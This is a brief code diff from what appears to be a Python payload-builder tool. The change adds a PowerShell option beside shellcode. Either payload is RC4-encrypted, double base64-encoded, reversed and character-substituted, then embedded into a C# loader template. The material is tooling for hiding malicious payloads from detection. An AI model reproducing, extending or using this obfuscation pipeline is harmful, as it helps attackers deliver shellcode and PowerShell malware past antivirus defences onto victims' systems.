@@ -164,9 +164,17 @@ if __name__ == "__main__":
     pattern1 = Helper.gen_pattern("#!@$%?&")
     pattern2 = Helper.gen_pattern(",.<>)(*[]{}")
 
-    cipher = Helper.replace_data(base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("shellcode"), True), key))[::-1]), pattern1, "N", pattern2, "B")
-    
+    cipher = ""
     template_path = "template/Program.cs"
+    if not config.get("shellcode") == "":
+        cipher = Helper.replace_data(base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("shellcode"), True), key))[::-1]), pattern1, "N", pattern2, "B")
+    elif not config.get("powershell") == "":
+	template_path = "template/Program-ps.cs"
+        cipher = Helper.replace_data(base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("powershell"), True), key))[::-1]), pattern1, "N", pattern2, "B")
+    else:
+	Helper.print_error("Missing config variable (shellcode or powershell)")
+	exit(0)
+    
     if args.report:
         template_path = "template/Program-report.cs"
 	
